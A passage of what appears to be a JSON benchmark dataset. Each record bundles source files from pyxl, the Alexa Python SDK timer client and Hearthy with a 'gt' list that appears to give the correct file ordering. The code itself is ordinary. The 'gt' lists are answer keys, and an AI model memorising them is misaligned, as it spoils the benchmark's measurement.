  'name': unicode,\n        'target': unicode,\n        'download': unicode,\n        }\n\nclass x_abbr(x_html_element):\n    pass\n\nclass x_acronym(x_html_element):\n    pass\n\nclass x_address(x_html_element):\n    pass\n\nclass x_area(x_html_element_nochild):\n    __attrs__ = {\n        'alt': unicode,\n        'coords': unicode,\n        'href': unicode,\n        'nohref': unicode,\n        'target': unicode,\n        }\n\nclass x_article(x_html_element):\n    pass\n\nclass x_aside(x_html_element):\n    pass\n\nclass x_audio(x_html_element):\n    __attrs__ = {\n        'src': unicode\n        }\n\nclass x_b(x_html_element):\n   pass\n\nclass x_big(x_html_element):\n   pass\n\nclass x_blockquote(x_html_element):\n    __attrs__ = {\n        'cite': unicode,\n        }\n\nclass x_body(x_html_element):\n    __attrs__ = {\n        'contenteditable': unicode,\n        }\n\nclass x_br(x_html_element_nochild):\n   pass\n\nclass x_button(x_html_element):\n    __attrs__ = {\n        'disabled': unicode,\n        'name': unicode,\n        'type': unicode,\n        'value': unicode,\n        }\n\nclass x_canvas(x_html_element):\n    __attrs__ = {\n        'height': unicode,\n        'width': unicode,\n        }\n\nclass x_caption(x_html_element):\n   pass\n\nclass x_cite(x_html_element):\n   pass\n\nclass x_code(x_html_element):\n   pass\n\nclass x_col(x_html_element_nochild):\n    __attrs__ = {\n        'align': unicode,\n        'char': unicode,\n        'charoff': int,\n        'span': int,\n        'valign': unicode,\n        'width': unicode,\n        }\n\nclass x_colgroup(x_html_element):\n    __attrs__ = {\n        'align': unicode,\n        'char': unicode,\n        'charoff': int,\n        'span': int,\n        'valign': unicode,\n        'width': unicode,\n        }\n\nclass x_datalist(x_html_element):\n    pass\n\nclass x_dd(x_html_element):\n   pass\n\nclass x_del(x_html_element):\n    __attrs__ = {\n        'cite': unicode,\n        'datetime': unicode,\n        }\n\nclass x_div(x_html_element):\n   __attrs__ = {\n        'contenteditable': unicode,\n       }\n\nclass x_dfn(x_html_element):\n   pass\n\nclass x_dl(x_html_element):\n   pass\n\nclass x_dt(x_html_element):\n   pass\n\nclass x_em(x_html_element):\n   pass\n\nclass x_embed(x_html_element):\n    __attrs__ = {\n        'src': unicode,\n        'width': unicode,\n        'height': unicode,\n        'allowscriptaccess': unicode,\n        'allowfullscreen': unicode,\n        'name': unicode,\n        'type': unicode,\n        }\n\nclass x_figure(x_html_element):\n   pass\n\nclass x_figcaption(x_html_element):\n   pass\n\nclass x_fieldset(x_html_element):\n   pass\n\nclass x_footer(x_html_element):\n    pass\n\nclass x_form(x_html_element):\n    __attrs__ = {\n        'action': unicode,\n        'accept': unicode,\n        'accept-charset': unicode,\n        'autocomplete': unicode,\n        'enctype': unicode,\n        'method': unicode,\n        'name': unicode,\n        'novalidate': unicode,\n        'target': unicode,\n        }\n\nclass x_form_error(x_base):\n    __attrs__ = {\n        'name': unicode\n        }\n\n    def _to_list(self, l):\n        l.extend((u'<form:error name=\"', self.attr('name'), u'\" />'))\n\nclass x_frame(x_html_element_nochild):\n    __attrs__ = {\n        'frameborder': unicode,\n        'longdesc': unicode,\n        'marginheight': unicode,\n        'marginwidth': unicode,\n        'name': unicode,\n        'noresize': unicode,\n        'scrolling': unicode,\n        'src': unicode,\n        }\n\nclass x_frameset(x_html_element):\n    __attrs__ = {\n        'rows': unicode,\n        'cols': unicode,\n        }\n\nclass x_h1(x_html_element):\n   pass\n\nclass x_h2(x_html_element):\n   pass\n\nclass x_h3(x_html_element):\n   pass\n\nclass x_h4(x_html_element):\n   pass\n\nclass x_h5(x_html_element):\n   pass\n\nclass x_h6(x_html_element):\n   pass\n\nclass x_head(x_html_element):\n    __attrs__ = {\n        'profile': unicode,\n        }\n\nclass x_header(x_html_element):\n    pass\n\nclass x_hr(x_html_element_nochild):\n    pass\n\nclass x_html(x_html_element):\n    __attrs__ = {\n        'content': unicode,\n        'scheme': unicode,\n        'http-equiv': unicode,\n        'xmlns': unicode,\n        'xmlns:og': unicode,\n        'xmlns:fb': unicode,\n        }\n\nclass x_i(x_html_element):\n   pass\n\nclass x_iframe(x_html_element):\n    __attrs__ = {\n        'frameborder': unicode,\n        'height': unicode,\n        'longdesc': unicode,\n        'marginheight': unicode,\n        'marginwidth': unicode,\n        'name': unicode,\n        'sandbox': unicode,\n        'scrolling': unicode,\n        'src': unicode,\n        'width': unicode,\n\n        'allowtransparency': unicode,\n        'allowfullscreen': unicode,\n        }\n\nclass x_video(x_html_element):\n    __attrs__ = {\n        'autoplay': unicode,\n        'controls': unicode,\n        'height': unicode,\n        'loop': unicode,\n        'muted': unicode,\n        'poster': unicode,\n        'preload': unicode,\n        'src': unicode,\n        'width': unicode,\n        }\n\nclass x_img(x_html_element_nochild):\n    __attrs__ = {\n        'alt': unicode,\n        'src': unicode,\n        'height': unicode,\n        'ismap': unicode,\n        'longdesc': unicode,\n        'usemap': unicode,\n        'vspace': unicode,\n        'width': unicode,\n        }\n\nclass x_input(x_html_element_nochild):\n    __attrs__ = {\n        'accept': unicode,\n        'align': unicode,\n        'alt': unicode,\n        'autofocus': unicode,\n        'checked': unicode,\n        'disabled': unicode,\n        'list': unicode,\n        'max': unicode,\n        'maxlength': unicode,\n        'min': unicode,\n        'name': unicode,\n        'pattern': unicode,\n        'placeholder': unicode,\n        'readonly': unicode,\n        'size': unicode,\n        'src': unicode,\n        'step': unicode,\n        'type': unicode,\n        'value': unicode,\n        'autocomplete': unicode,\n        'autocorrect': unicode,\n        'required': unicode,\n        'spellcheck': unicode,\n        'multiple': unicode,\n        }\n\nclass x_ins(x_html_element):\n    __attrs__ = {\n        'cite': unicode,\n        'datetime': unicode,\n        }\n\nclass x_kbd(x_html_element):\n    pass\n\nclass x_label(x_html_element):\n    __attrs__ = {\n        'for': unicode,\n        }\n\nclass x_legend(x_html_element):\n   pass\n\nclass x_li(x_html_element):\n   pass\n\nclass x_link(x_html_element_nochild):\n    __attrs__ = {\n        'charset': unicode,\n        'href': unicode,\n        'hreflang': unicode,\n        'media': unicode,\n        'rel': unicode,\n        'rev': unicode,\n        'sizes': unicode,\n        'target': unicode,\n        'type': unicode,\n        }\n\nclass x_main(x_html_element):\n\n\n    __attrs__ = {\n        'role': unicode,\n    }\n\nclass x_map(x_html_element):\n    __attrs__ = {\n        'name': unicode,\n        }\n\nclass x_meta(x_html_element_nochild):\n    __attrs__ = {\n        'content': unicode,\n        'http-equiv': unicode,\n        'name': unicode,\n        'property': unicode,\n        'scheme': unicode,\n        'charset': unicode,\n        }\n\nclass x_nav(x_html_element):\n    pass\n\nclass x_noframes(x_html_element):\n   pass\n\nclass x_noscript(x_html_element):\n   pass\n\nclass x_object(x_html_element):\n    __attrs__ = {\n        'align': unicode,\n        'archive': unicode,\n        'border': unicode,\n        'classid': unicode,\n        'codebase': unicode,\n        'codetype': unicode,\n        'data': unicode,\n        'declare': unicode,\n        'height': unicode,\n        'hspace': unicode,\n        'name': unicode,\n        'standby': unicode,\n        'type': unicode,\n        'usemap': unicode,\n        'vspace': unicode,\n        'width': unicode,\n        }\n\nclass x_ol(x_html_element):\n   pass\n\nclass x_optgroup(x_html_element):\n    __attrs__ = {\n        'disabled': unicode,\n        'label': unicode,\n        }\n\nclass x_option(x_html_element):\n    __attrs__ = {\n        'disabled': unicode,\n        'label': unicode,\n        'selected': unicode,\n        'value': unicode,\n        }\n\nclass x_p(x_html_element):\n   pass\n\nclass x_param(x_html_element):\n    __attrs__ = {\n        'name': unicode,\n        'type': unicode,\n        'value': unicode,\n        'valuetype': unicode,\n        }\n\nclass x_pre(x_html_element):\n   pass\n\nclass x_progress(x_html_element):\n    __attrs__ = {\n        'max': int,\n        'value': int,\n    }\n\nclass x_q(x_html_element):\n    __attrs__ = {\n        'cite': unicode,\n        }\n\nclass x_samp(x_html_element):\n   pass\n\nclass x_script(x_html_element):\n    __attrs__ = {\n        'async': unicode,\n        'charset': unicode,\n        'defer': unicode,\n        'src': unicode,\n        'type': unicode,\n        }\n\nclass x_section(x_html_element):\n    pass\n\nclass x_select(x_html_element):\n    __attrs__ = {\n        'disabled': unicode,\n        'multiple': unicode,\n        'name': unicode,\n        'size': unicode,\n        'required': unicode,\n        }\n\nclass x_small(x_html_element):\n   pass\n\nclass x_span(x_html_element):\n   pass\n\nclass x_strong(x_html_element):\n   pass\n\nclass x_style(x_html_element):\n    __attrs__ = {\n        'media': unicode,\n        'type': unicode,\n        }\n\nclass x_sub(x_html_element):\n   pass\n\nclass x_sup(x_html_element):\n   pass\n\nclass x_table(x_html_element):\n    __attrs__ = {\n        'border': unicode,\n        'cellpadding': unicode,\n        'cellspacing': unicode,\n        'frame': unicode,\n        'rules': unicode,\n        'summary': unicode,\n        'width': unicode,\n        }\n\nclass x_tbody(x_html_element):\n    __attrs__ = {\n        'align': unicode,\n        'char': unicode,\n        'charoff': unicode,\n        'valign': unicode,\n        }\n\nclass x_td(x_html_element):\n    __attrs__ = {\n        'abbr': unicode,\n        'align': unicode,\n        'axis': unicode,\n        'char': unicode,\n        'charoff': unicode,\n        'colspan': unicode,\n        'headers': unicode,\n        'rowspan': unicode,\n        'scope': unicode,\n        'valign': unicode,\n        }\n\nclass x_textarea(x_html_element):\n    __attrs__ = {\n        'cols': unicode,\n        'rows': unicode,\n        'disabled': unicode,\n        'placeholder': unicode,\n        'name': unicode,\n        'readonly': unicode,\n        'autocorrect': unicode,\n        'autocomplete': unicode,\n        'autocapitalize': unicode,\n        'spellcheck': unicode,\n        'autofocus': unicode,\n        'required': unicode,\n        }\n\nclass x_tfoot(x_html_element):\n    __attrs__ = {\n        'align': unicode,\n        'char': unicode,\n        'charoff': unicode,\n        'valign': unicode,\n        }\n\nclass x_th(x_html_element):\n    __attrs__ = {\n        'abbr': unicode,\n        'align': unicode,\n        'axis': unicode,\n        'char': unicode,\n        'charoff': unicode,\n        'colspan': unicode,\n        'rowspan': unicode,\n        'scope': unicode,\n        'valign': unicode,\n        }\n\nclass x_thead(x_html_element):\n    __attrs__ = {\n        'align': unicode,\n        'char': unicode,\n        'charoff': unicode,\n        'valign': unicode,\n        }\n\nclass x_time(x_html_element):\n    __attrs__ = {\n        'datetime': unicode,\n        }\n\nclass x_title(x_html_element):\n   pass\n\nclass x_tr(x_html_element):\n    __attrs__ = {\n        'align': unicode,\n        'char': unicode,\n        'charoff': unicode,\n        'valign': unicode,\n        }\n\nclass x_tt(x_html_element):\n    pass\n\nclass x_u(x_html_element):\n    pass\n\nclass x_ul(x_html_element):\n    pass\n\nclass x_var(x_html_element):\n    pass\n\n'pyxl/pyxl/browser_hacks.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom pyxl.base import x_base\nfrom pyxl.utils import escape\n\nclass x_cond_comment(x_base):\n    __attrs__ = {\n        'cond': unicode,\n        }\n\n    def _to_list(self, l):\n\n        cond = self.__attributes__.get('cond', '')\n        cond = '&'.join(map(escape, cond.split('&')))\n\n        l.extend((u'<!--[if ', cond, u']>'))\n\n        for child in self.__children__:\n            x_base._render_child_to_list(child, l)\n\n        l.append(u'<![endif]-->')\n\nclass x_cond_noncomment(x_base):\n    ''' This is a conditional comment where browsers which don't support conditional comments\n        will parse the children by default. '''\n    __attrs__ = {\n        'cond': unicode,\n        }\n\n    def _to_list(self, l):\n\n        cond = self.__attributes__.get('cond', '')\n        cond = '&'.join(map(escape, cond.split('&')))\n\n        l.extend((u'<!--[if ', cond, u']><!-->'))\n\n        for child in self.__children__:\n            x_base._render_child_to_list(child, l)\n\n        l.append(u'<!--<![endif]-->')\n\n",
        "gt": [
            "'pyxl/pyxl/utils.py'",
            "'pyxl/pyxl/browser_hacks.py'",
            "'pyxl/pyxl/html.py'",
            "'pyxl/pyxl/codec/parser.py'"
        ]
    },
    {
        "files": [
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/services/timer_management/__init__.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/services/timer_management/timer_management_service_client.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/services/utils.py'"
        ],
        "content": "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/services/timer_management/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\n\nfrom .visibility import Visibility\nfrom .text_to_announce import TextToAnnounce\nfrom .notification_config import NotificationConfig\nfrom .error import Error\nfrom .task import Task\nfrom .timer_management_service_client import TimerManagementServiceClient\nfrom .launch_task_operation import LaunchTaskOperation\nfrom .timers_response import TimersResponse\nfrom .notify_only_operation import NotifyOnlyOperation\nfrom .timer_request import TimerRequest\nfrom .display_experience import DisplayExperience\nfrom .triggering_behavior import TriggeringBehavior\nfrom .creation_behavior import CreationBehavior\nfrom .timer_response import TimerResponse\nfrom .announce_operation import AnnounceOperation\nfrom .text_to_confirm import TextToConfirm\nfrom .status import Status\nfrom .operation import Operation\n\n'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/services/timer_management/timer_management_service_client.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport sys\nimport os\nimport re\nimport six\nimport typing\n\nfrom ask_sdk_model.services.base_service_client import BaseServiceClient\nfrom ask_sdk_model.services.api_configuration import ApiConfiguration\nfrom ask_sdk_model.services.service_client_response import ServiceClientResponse\nfrom ask_sdk_model.services.api_response import ApiResponse\nfrom ask_sdk_model.services.utils import user_agent_info\n\n\n\nif typing.TYPE_CHECKING:\n    from typing import Dict, List, Union, Any\n    from datetime import datetime\n    from ask_sdk_model.services.timer_management.timers_response import TimersResponse as TimersResponse_df2de7c\n    from ask_sdk_model.services.timer_management.timer_request import TimerRequest as TimerRequest_5f036a34\n    from ask_sdk_model.services.timer_management.error import Error as Error_249911d1\n    from ask_sdk_model.services.timer_management.timer_response import TimerResponse as TimerResponse_5be9ee64\n\n\nclass TimerManagementServiceClient(BaseServiceClient):\n\n    def __init__(self, api_configuration, custom_user_agent=None):\n\n\n        super(TimerManagementServiceClient, self).__init__(api_configuration)\n        self.user_agent = user_agent_info(sdk_version=\"1.0.0\", custom_user_agent=custom_user_agent)\n\n    def delete_timers(self, **kwargs):\n\n\n        operation_name = \"delete_timers\"\n        params = locals()\n        for key, val in six.iteritems(params['kwargs']):\n            params[key] = val\n        del params['kwargs']\n\n        resource_path = '/v1/alerts/timers'\n        resource_path = resource_path.replace('{format}', 'json')\n\n        path_params = {}\n\n        query_params = []\n\n        header_params = []\n\n        body_params = None\n        header_params.append(('Content-type', 'application/json'))\n        header_params.append(('User-Agent', self.user_agent))\n\n\n        full_response = False\n        if 'full_response' in params:\n            full_response = params['full_response']\n\n\n        authorization_value = \"Bearer \" + self._authorization_value\n        header_params.append((\"Authorization\", authorization_value))\n\n        error_definitions = []\n        error_definitions.append(ServiceClientResponse(response_type=None, status_code=200, message=\"Success\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=400, message=\"Bad Request\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=401, message=\"Unauthorized\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=500, message=\"Internal Server Error\"))\n\n        api_response = self.invoke(\n            method=\"DELETE\",\n            endpoint=self._api_endpoint,\n            path=resource_path,\n            path_params=path_params,\n            query_params=query_params,\n            header_params=header_params,\n            body=body_params,\n            response_definitions=error_definitions,\n            response_type=None)\n\n        if full_response:\n            return api_response\n\n        return None\n\n    def get_timers(self, **kwargs):\n\n\n        operation_name = \"get_timers\"\n        params = locals()\n        for key, val in six.iteritems(params['kwargs']):\n            params[key] = val\n        del params['kwargs']\n\n        resource_path = '/v1/alerts/timers'\n        resource_path = resource_path.replace('{format}', 'json')\n\n        path_params = {}\n\n        query_params = []\n\n        header_params = []\n\n        body_params = None\n        header_params.append(('Content-type', 'application/json'))\n        header_params.append(('User-Agent', self.user_agent))\n\n\n        full_response = False\n        if 'full_response' in params:\n            full_response = params['full_response']\n\n\n        authorization_value = \"Bearer \" + self._authorization_value\n        header_params.append((\"Authorization\", authorization_value))\n\n        error_definitions = []\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.timers_response.TimersResponse\", status_code=200, message=\"Success\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=400, message=\"Bad Request\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=401, message=\"Unauthorized\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=500, message=\"Internal Server Error\"))\n\n        api_response = self.invoke(\n            method=\"GET\",\n            endpoint=self._api_endpoint,\n            path=resource_path,\n            path_params=path_params,\n            query_params=query_params,\n            header_params=header_params,\n            body=body_params,\n            response_definitions=error_definitions,\n            response_type=\"ask_sdk_model.services.timer_management.timers_response.TimersResponse\")\n\n        if full_response:\n            return api_response\n        return api_response.body\n\n\n    def delete_timer(self, id, **kwargs):\n\n\n        operation_name = \"delete_timer\"\n        params = locals()\n        for key, val in six.iteritems(params['kwargs']):\n            params[key] = val\n        del params['kwargs']\n\n        if ('id' not in params) or (params['id'] is None):\n            raise ValueError(\n                \"Missing the required parameter `id` when calling `\" + operation_name + \"`\")\n\n        resource_path = '/v1/alerts/timers/{id}'\n        resource_path = resource_path.replace('{format}', 'json')\n\n        path_params = {}\n        if 'id' in params:\n            path_params['id'] = params['id']\n\n        query_params = []\n\n        header_params = []\n\n        body_params = None\n        header_params.append(('Content-type', 'application/json'))\n        header_params.append(('User-Agent', self.user_agent))\n\n\n        full_response = False\n        if 'full_response' in params:\n            full_response = params['full_response']\n\n\n        authorization_value = \"Bearer \" + self._authorization_value\n        header_params.append((\"Authorization\", authorization_value))\n\n        error_definitions = []\n        error_definitions.append(ServiceClientResponse(response_type=None, status_code=200, message=\"Success\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=400, message=\"Bad Request\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=401, message=\"Unauthorized\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=404, message=\"Timer not found\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=500, message=\"Internal Server Error\"))\n\n        api_response = self.invoke(\n            method=\"DELETE\",\n            endpoint=self._api_endpoint,\n            path=resource_path,\n            path_params=path_params,\n            query_params=query_params,\n            header_params=header_params,\n            body=body_params,\n            response_definitions=error_definitions,\n            response_type=None)\n\n        if full_response:\n            return api_response\n\n        return None\n\n    def get_timer(self, id, **kwargs):\n\n\n        operation_name = \"get_timer\"\n        params = locals()\n        for key, val in six.iteritems(params['kwargs']):\n            params[key] = val\n        del params['kwargs']\n\n        if ('id' not in params) or (params['id'] is None):\n            raise ValueError(\n                \"Missing the required parameter `id` when calling `\" + operation_name + \"`\")\n\n        resource_path = '/v1/alerts/timers/{id}'\n        resource_path = resource_path.replace('{format}', 'json')\n\n        path_params = {}\n        if 'id' in params:\n            path_params['id'] = params['id']\n\n        query_params = []\n\n        header_params = []\n\n        body_params = None\n        header_params.append(('Content-type', 'application/json'))\n        header_params.append(('User-Agent', self.user_agent))\n\n\n        full_response = False\n        if 'full_response' in params:\n            full_response = params['full_response']\n\n\n        authorization_value = \"Bearer \" + self._authorization_value\n        header_params.append((\"Authorization\", authorization_value))\n\n        error_definitions = []\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.timer_response.TimerResponse\", status_code=200, message=\"Success\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=400, message=\"Bad Request\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=401, message=\"Unauthorized\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=404, message=\"Timer not found\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=500, message=\"Internal Server Error\"))\n\n        api_response = self.invoke(\n            method=\"GET\",\n            endpoint=self._api_endpoint,\n            path=resource_path,\n            path_params=path_params,\n            query_params=query_params,\n            header_params=header_params,\n            body=body_params,\n            response_definitions=error_definitions,\n            response_type=\"ask_sdk_model.services.timer_management.timer_response.TimerResponse\")\n\n        if full_response:\n            return api_response\n        return api_response.body\n\n\n    def pause_timer(self, id, **kwargs):\n\n\n        operation_name = \"pause_timer\"\n        params = locals()\n        for key, val in six.iteritems(params['kwargs']):\n            params[key] = val\n        del params['kwargs']\n\n        if ('id' not in params) or (params['id'] is None):\n            raise ValueError(\n                \"Missing the required parameter `id` when calling `\" + operation_name + \"`\")\n\n        resource_path = '/v1/alerts/timers/{id}/pause'\n        resource_path = resource_path.replace('{format}', 'json')\n\n        path_params = {}\n        if 'id' in params:\n            path_params['id'] = params['id']\n\n        query_params = []\n\n        header_params = []\n\n        body_params = None\n        header_params.append(('Content-type', 'application/json'))\n        header_params.append(('User-Agent', self.user_agent))\n\n\n        full_response = False\n        if 'full_response' in params:\n            full_response = params['full_response']\n\n\n        authorization_value = \"Bearer \" + self._authorization_value\n        header_params.append((\"Authorization\", authorization_value))\n\n        error_definitions = []\n        error_definitions.append(ServiceClientResponse(response_type=None, status_code=200, message=\"Success\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=400, message=\"Bad Request\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=401, message=\"Unauthorized\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=404, message=\"Timer not found\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=500, message=\"Internal Server Error\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=504, message=\"Device offline\"))\n\n        api_response = self.invoke(\n            method=\"POST\",\n            endpoint=self._api_endpoint,\n            path=resource_path,\n            path_params=path_params,\n            query_params=query_params,\n            header_params=header_params,\n            body=body_params,\n            response_definitions=error_definitions,\n            response_type=None)\n\n        if full_response:\n            return api_response\n\n        return None\n\n    def resume_timer(self, id, **kwargs):\n\n\n        operation_name = \"resume_timer\"\n        params = locals()\n        for key, val in six.iteritems(params['kwargs']):\n            params[key] = val\n        del params['kwargs']\n\n        if ('id' not in params) or (params['id'] is None):\n            raise ValueError(\n                \"Missing the required parameter `id` when calling `\" + operation_name + \"`\")\n\n        resource_path = '/v1/alerts/timers/{id}/resume'\n        resource_path = resource_path.replace('{format}', 'json')\n\n        path_params = {}\n        if 'id' in params:\n            path_params['id'] = params['id']\n\n        query_params = []\n\n        header_params = []\n\n        body_params = None\n        header_params.append(('Content-type', 'application/json'))\n        header_params.append(('User-Agent', self.user_agent))\n\n\n        full_response = False\n        if 'full_response' in params:\n            full_response = params['full_response']\n\n\n        authorization_value = \"Bearer \" + self._authorization_value\n        header_params.append((\"Authorization\", authorization_value))\n\n        error_definitions = []\n        error_definitions.append(ServiceClientResponse(response_type=None, status_code=200, message=\"Success\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=400, message=\"Bad Request\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=401, message=\"Unauthorized\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=404, message=\"Timer not found\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=500, message=\"Internal Server Error\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=504, message=\"Device offline\"))\n\n        api_response = self.invoke(\n            method=\"POST\",\n            endpoint=self._api_endpoint,\n            path=resource_path,\n            path_params=path_params,\n            query_params=query_params,\n            header_params=header_params,\n            body=body_params,\n            response_definitions=error_definitions,\n            response_type=None)\n\n        if full_response:\n            return api_response\n\n        return None\n\n    def create_timer(self, timer_request, **kwargs):\n\n\n        operation_name = \"create_timer\"\n        params = locals()\n        for key, val in six.iteritems(params['kwargs']):\n            params[key] = val\n        del params['kwargs']\n\n        if ('timer_request' not in params) or (params['timer_request'] is None):\n            raise ValueError(\n                \"Missing the required parameter `timer_request` when calling `\" + operation_name + \"`\")\n\n        resource_path = '/v1/alerts/timers'\n        resource_path = resource_path.replace('{format}', 'json')\n\n        path_params = {}\n\n        query_params = []\n\n        header_params = []\n\n        body_params = None\n        if 'timer_request' in params:\n            body_params = params['timer_request']\n        header_params.append(('Content-type', 'application/json'))\n        header_params.append(('User-Agent', self.user_agent))\n\n\n        full_response = False\n        if 'full_response' in params:\n            full_response = params['full_response']\n\n\n        authorization_value = \"Bearer \" + self._authorization_value\n        header_params.append((\"Authorization\", authorization_value))\n\n        error_definitions = []\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.timer_response.TimerResponse\", status_code=200, message=\"Success\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=400, message=\"Bad Request\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=401, message=\"Unauthorized\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=403, message=\"Forbidden\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=500, message=\"Internal Server Error\"))\n        error_definitions.append(ServiceClientResponse(response_type=\"ask_sdk_model.services.timer_management.error.Error\", status_code=504, message=\"Device offline\"))\n\n        api_response = self.invoke(\n            method=\"POST\",\n            endpoint=self._api_endpoint,\n            path=resource_path,\n            path_params=path_params,\n            query_params=query_params,\n            header_params=header_params,\n            body=body_params,\n            response_definitions=error_definitions,\n            response_type=\"ask_sdk_model.services.timer_management.timer_response.TimerResponse\")\n\n        if full_response:\n            return api_response\n        return api_response.body\n\n\n'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/services/utils.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport sys\n\ndef user_agent_info(sdk_version, custom_user_agent):\n\n\n    python_version = \".\".join(str(x) for x in sys.version_info[0:3])\n    user_agent = \"ask-python-model/{} Python/{}\".format(\n        sdk_version, python_version)\n    if custom_user_agent is None:\n        return user_agent\n    else:\n        return user_agent + \" {}\".format(custom_user_agent)\n",
        "gt": [
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/services/utils.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/services/timer_management/timer_management_service_client.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/services/timer_management/__init__.py'"
        ]
    },
    {
        "files": [
            "'Hearthy/hearthy/ui/tk/entitybrowser.py'",
            "'Hearthy/hearthy/ui/tkmain.py'",
            "'Hearthy/hearthy/ui/tk/streamlist.py'",
            "'Hearthy/hearthy/tracker/entity.py'"
        ],
        "content": "'Hearthy/hearthy/ui/tk/entitybrowser.py'\n:import tkinter\nfrom tkinter import ttk\n\nfrom hearthy.protocol import utils\nfrom hearthy.protocol.enums import GameTag\nfrom hearthy.tracker.entity import MutableView\n\nALL_TAGS = sorted([x.capitalize() for x in GameTag.reverse.values()])\n\nclass EntityFilter(ttk.Frame):\n    def __init__(self, parent):\n        super().__init__(parent)\n\n        self.tag = tkinter.StringVar()\n        self.test = tkinter.StringVar()\n        self.value = tkinter.StringVar()\n\n        ctag = ttk.Combobox(self, textvariable=self.tag, state='readonly')\n        ctag['values'] = ALL_TAGS\n        ctag.bind('<<ComboboxSelected>>', self._on_tag_change)\n\n        ftest = ttk.Combobox(self, textvariable=self.test, state='readonly')\n        ftest['values'] = ('Exists', 'Not Exists', 'Equals', 'Not Equals')\n\n        fvalue = ttk.Combobox(self, textvariable=self.value)\n        b_remove = ttk.Button(self, text='Remove', command=self._on_remove)\n\n        ctag.grid(row=0, column=0, sticky='nsew')\n        ftest.grid(row=0, column=1, sticky='nsew')\n        fvalue.grid(row=0, column=2, sticky='nsew')\n        b_remove.grid(row=0, column=3, sticky='nsew')\n\n        self.grid_rowconfigure(0, weight=1)\n        self.grid_columnconfigure(0, weight=1)\n        self.grid_columnconfigure(1, weight=1)\n        self.grid_columnconfigure(2, weight=1)\n\n        self._fvalue = fvalue\n\n        self.cb = None\n\n    def get_filter_string(self):\n        tag = self.tag.get()\n        test = self.test.get()\n        value = self.value.get()\n\n        tag = GameTag.__dict__.get(tag.upper(), tag)\n        try:\n            tag = int(tag)\n        except ValueError:\n            print('Err: {0!r} is not numeric'.format(tag))\n            return\n\n        if test == 'Exists':\n            return '(x[{0}] is not None)'.format(tag)\n        elif test == 'Not Exists':\n            return '(x[{0}] is None)'.format(tag)\n\n        enum = utils._gametag_to_enum.get(tag, None)\n        if enum is not None:\n            value = enum.__dict__.get(value.upper(), value)\n\n        try:\n            value = int(value)\n        except ValueError:\n            print('Err: {0!r} is not numeric'.format(value))\n            return\n\n        if test == 'Equals':\n            return '(x[{0}] == {1})'.format(tag, value)\n        elif test == 'Not Equals':\n            return '(x[{0}] != {1})'.format(tag, value)\n\n    def _on_remove(self):\n        if self.cb is not None:\n            self.cb(self, 'remove')\n\n    def _on_tag_change(self, val):\n        tagval = self.tag.get()\n        numeric = 